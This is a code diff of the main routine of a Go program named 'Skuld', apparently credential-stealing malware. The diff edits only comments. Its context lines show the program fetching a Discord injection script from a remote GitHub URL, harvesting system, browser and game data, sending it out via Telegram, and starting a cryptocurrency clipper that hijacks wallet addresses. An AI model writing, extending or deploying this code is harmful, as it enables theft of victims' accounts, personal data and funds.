@@ -78,6 +78,7 @@ func main() {
 	// Send startup message
 	dataCollector.SendMessage("🚀 Skuld started data collection...")
 
+	// Start injection modules (non-blocking)
 	go discordinjection.Run(
 		"https://raw.githubusercontent.com/hackirby/discord-injection/main/injection.js",
 		dataCollector,
@@ -88,7 +89,7 @@ func main() {
 		dataCollector,
 	)
 
-	// Run data collection modules
+	// Run data collection modules in parallel
 	actions := []func(*collector.DataCollector){
 		system.Run,
 		browsers.Run,
@@ -99,6 +100,7 @@ func main() {
 		games.Run,
 	}
 
+	// Wait for all modules to complete
 	var wg sync.WaitGroup
 	for _, action := range actions {
 		wg.Add(1)
@@ -108,17 +110,17 @@ func main() {
 		}(action)
 	}
 
-	// Wait for all data collection to complete
+	// Wait for all data collection modules to complete
 	wg.Wait()
 
-	// Send all collected data
+	// Send all collected data via Telegram
 	if err := dataCollector.SendCollectedData(); err != nil {
 		log.Printf("Failed to send collected data: %v", err)
 		dataCollector.SendMessage(fmt.Sprintf("❌ Error sending data: %v", err))
 	} else {
-		dataCollector.SendMessage("✅ Data collection completed successfully!")
+		dataCollector.SendMessage("✅ Data collection and transmission completed successfully!")
 	}
 
-	// Start clipper (runs indefinitely)
+	// Start clipper (runs indefinitely in background)
 	clipper.Run(CONFIG["cryptos"].(map[string]string))
 }
